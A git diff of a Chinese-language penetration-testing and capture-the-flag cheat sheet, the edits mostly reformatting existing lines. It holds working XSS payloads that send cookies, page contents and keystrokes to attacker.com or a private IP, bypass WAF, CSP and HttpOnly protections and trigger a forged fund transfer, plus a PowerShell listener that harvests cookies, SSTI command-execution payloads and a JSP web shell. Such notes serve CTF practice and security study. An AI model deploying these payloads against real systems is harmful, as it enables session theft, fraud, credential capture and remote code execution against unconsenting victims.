@@ -379,9 +379,9 @@ fetch(`/getflag\)
   這個還有其他場景要注意，<span style="background-color: yellow">假設 victim 通不到外網也沒有 python 開 server，那就用 powershell</span>
 
   ```ps
-  > $listener = [System.Net.HttpListener]::new();
-  > $listener.Prefixes.Add("http://127.0.0.1:8000/"); # 如果綁 `0.0.0.0`（需提權）→ `$listener.Prefixes.Add("http://+:8000/");` 這樣的話，內網中的其他 Victim 使用 XSS 腳本才會打到目前這一台主機
-  > $listener.Start(); Write-Host "[*] Listening on port 8000..."; while ($true) { $ctx = $listener.GetContext(); $req = $ctx.Request; Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $($req.HttpMethod) $($req.Url)" -ForegroundColor Green; Write-Host "  Cookie: $($req.Headers['Cookie'])" -ForegroundColor Yellow; $resp = $ctx.Response; $resp.StatusCode = 200; $body = [Text.Encoding]::UTF8.GetBytes("ok"); $resp.OutputStream.Write($body, 0, $body.Length); $resp.Close() }
+  $ $listener = [System.Net.HttpListener]::new();
+  $ $listener.Prefixes.Add("http://127.0.0.1:8000/"); # 如果綁 `0.0.0.0`（需提權）→ `$listener.Prefixes.Add("http://+:8000/");` 這樣的話，內網中的其他 Victim 使用 XSS 腳本才會打到目前這一台主機
+  $ $listener.Start(); Write-Host "[*] Listening on port 8000..."; while ($true) { $ctx = $listener.GetContext(); $req = $ctx.Request; Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $($req.HttpMethod) $($req.Url)" -ForegroundColor Green; Write-Host "  Cookie: $($req.Headers['Cookie'])" -ForegroundColor Yellow; $resp = $ctx.Response; $resp.StatusCode = 200; $body = [Text.Encoding]::UTF8.GetBytes("ok"); $resp.OutputStream.Write($body, 0, $body.Length); $resp.Close() }
   ```
 
   然後如果 payload 不能有 URL encode，可以寫 `/` 當作路徑的一部分
@@ -402,16 +402,16 @@ fetch(`/getflag\)
 
   ```js
   # 簡單測試用
-  <a href="javascript:alert(1)">test</a>
-  </svgonclick=alert(1)>
-  <img src="x" onerror="alert(1)">
+  $ <a href="javascript:alert(1)">test</a>
+  $ </svgonclick=alert(1)>
+  $ <img src="x" onerror="alert(1)">
 
   # 想要打到 Webhook ，可以值記看 Network 有沒有真的 request ，有時候會因為 http{s} 的原因而沒有送出
-  <math><mtext><table><mglyph><style><!--</style><img src=x onerror=fetch('http://172.21.112.129:8000/123/'+document.domain+'/'+Date.now())>
-  <math><mtext><table><mglyph><style><!--</style><img src=x onerror=fetch(`https://172.21.112.129:8443/${document.domain}/${document.cookie}`)>
+  $ <math><mtext><table><mglyph><style><!--</style><img src=x onerror=fetch('http://172.21.112.129:8000/123/'+document.domain+'/'+Date.now())>
+  $ <math><mtext><table><mglyph><style><!--</style><img src=x onerror=fetch(`https://172.21.112.129:8443/${document.domain}/${document.cookie}`)>
 
   # 用 document.location 跳轉(跳轉不受 mixed content 限制)
-  <math><mtext><table><mglyph><style><!--</style><img src=x onerror=document.location=`http://172.21.112.129:8000/?d=${document.domain}&c=${document.cookie}`>
+  $ <math><mtext><table><mglyph><style><!--</style><img src=x onerror=document.location=`http://172.21.112.129:8000/?d=${document.domain}&c=${document.cookie}`>
   ```
 
   </details>
@@ -425,18 +425,18 @@ fetch(`/getflag\)
 
   ```js
   // WAF 擋 alert() → 改用 print() 或 confirm() 確認 XSS 觸發
-  <img src=x onerror="print()">
-  <img src=x onerror="confirm(1)">
+  $ <img src=x onerror="print()">
+  $ <img src=x onerror="confirm(1)">
 
   // WAF 擋 event handler 中的 URL → 用 atob() 解碼 base64 繞過
   // echo -n "https://attacker.com/?s=" | base64
-  <img src=x onerror="top.location=atob(`aHR0cHM6Ly9hdHRhY2tlci5jb20vP3M9`)+document.cookie">
+  $ <img src=x onerror="top.location=atob(`aHR0cHM6Ly9hdHRhY2tlci5jb20vP3M9`)+document.cookie">
 
   // 後端把單引號 ' 轉成 '' (SQL-style escaping) → 改用反引號 ` (template literal)
-  <img src=x onerror="top.location=atob(`base64payload`)+`test`">
+  $ <img src=x onerror="top.location=atob(`base64payload`)+`test`">
 
   // 雙引號在 split 等操作中需要 → 用 \x22 代替
-  t.split(`sessionId`)[1].split(`\x22`)[1]
+  $ t.split(`sessionId`)[1].split(`\x22`)[1]
   ```
 
   ##### CSP 繞過
@@ -444,14 +444,14 @@ fetch(`/getflag\)
   ```js
   // CSP default-src 'self' 擋 img-src / connect-src 到外部
   // 但 CSP 無法阻擋 navigation，所以用 top.location 跳轉外帶資料
-  <img src=x onerror="top.location=`https://attacker.com/?d=`+document.cookie">
+  $ <img src=x onerror="top.location=`https://attacker.com/?d=`+document.cookie">
 
   // XSS 在 iframe 裡時，location= 只導航 iframe 本身
   // frame-src 'self' 會擋，改用 top.location= (同源 iframe 可導航 top)
-  <img src=x onerror="top.location=`https://attacker.com/?d=`+document.cookie">
+  $ <img src=x onerror="top.location=`https://attacker.com/?d=`+document.cookie">
 
   // CSP connect-src 'self' → 同源 fetch 不受限，可讀取認證後頁面再外帶
-  <img src=x onerror="fetch(`/admin/settings`).then(r=>r.text()).then(t=>{top.location=`https://attacker.com/?d=`+encodeURIComponent(t.substring(0,500))})">
+  $ <img src=x onerror="fetch(`/admin/settings`).then(r=>r.text()).then(t=>{top.location=`https://attacker.com/?d=`+encodeURIComponent(t.substring(0,500))})">
   ```
 
   ##### HttpOnly Cookie 繞過
@@ -459,23 +459,23 @@ fetch(`/getflag\)
   ```js
   // HttpOnly 擋 document.cookie 讀取 session cookie
   // 策略 1: 找其他頁面 HTML/JS 中洩漏的 session 變數，用同源 fetch 讀取
-  <img src=x onerror="fetch(`/page-with-session-var`).then(r=>r.text()).then(t=>{top.location=`https://attacker.com/?s=`+t.split(`sessionId`)[1].split(`\x22`)[1]})">
+  $ <img src=x onerror="fetch(`/page-with-session-var`).then(r=>r.text()).then(t=>{top.location=`https://attacker.com/?s=`+t.split(`sessionId`)[1].split(`\x22`)[1]})">
 
   // 策略 2: 不偷 session，直接以受害者身份執行操作（同源 request 自動帶 cookie）
-  <img src=x onerror="fetch(`/api/transfer`,{method:`POST`,headers:{'Content-Type':'application/x-www-form-urlencoded'},body:`to=attacker&amount=9999`})">
+  $ <img src=x onerror="fetch(`/api/transfer`,{method:`POST`,headers:{'Content-Type':'application/x-www-form-urlencoded'},body:`to=attacker&amount=9999`})">
 
   // 策略 3: 抓取敏感頁面資料外帶
-  <img src=x onerror="fetch(`/account/info`).then(r=>r.text()).then(t=>{top.location=`https://attacker.com/?d=`+encodeURIComponent(t.substring(0,800))})">
+  $ <img src=x onerror="fetch(`/account/info`).then(r=>r.text()).then(t=>{top.location=`https://attacker.com/?d=`+encodeURIComponent(t.substring(0,800))})">
 
   // 策略 4: 注入 keylogger 偷密碼
-  <img src=x onerror="top.document.onkeypress=function(e){new Image().src=`https://attacker.com/?k=`+e.key}">
+  $ <img src=x onerror="top.document.onkeypress=function(e){new Image().src=`https://attacker.com/?k=`+e.key}">
   ```
 
   ##### Debug 技巧
 
   ```js
   // 加 .catch() 避免 payload 靜默失敗，錯誤也送到外部
-  <img src=x onerror="fetch(`/target`).then(r=>r.text()).then(t=>{top.location=`https://attacker.com/?s=`+t.length}).catch(e=>{top.location=`https://attacker.com/?err=`+e})">
+  $ <img src=x onerror="fetch(`/target`).then(r=>r.text()).then(t=>{top.location=`https://attacker.com/?s=`+t.length}).catch(e=>{top.location=`https://attacker.com/?err=`+e})">
 
   // 開發順序: 先送回應長度確認 fetch → 再送內容片段確認 parse → 最後組完整 payload
   ```
@@ -501,7 +501,7 @@ fetch(`/getflag\)
 - SSTI Payload: 記得找<span style="background-color: yellow">os.\_wrap_close</span>
   {% raw %}
 
-  ```
+  ```txt
   {{().__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('id')}}
   {{self.__init__.__globals__.__builtins__.__import__("os").popen("cat%20Flag.txt").read()}}
   {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", "./flag.txt")}}
@@ -526,11 +526,11 @@ fetch(`/getflag\)
 
 - 如果是 CMD: 會輸出 `CMD`
   ```bash
-  (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+  $ (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
   ```
 - 如果是 Powershell 則會輸出 `Powershell`
   ```powershell
-  (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+  $ (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
   ```
 - 實際範例
   ```bash
@@ -844,7 +844,7 @@ create 一個偽造的 payload 和一個對外的中間 server 溝通，並讓�
 
 - 最簡單
   ```java
-  <%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>
+  $ <%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>
   ```
 - Reverse Shell
   <details markdown="1">
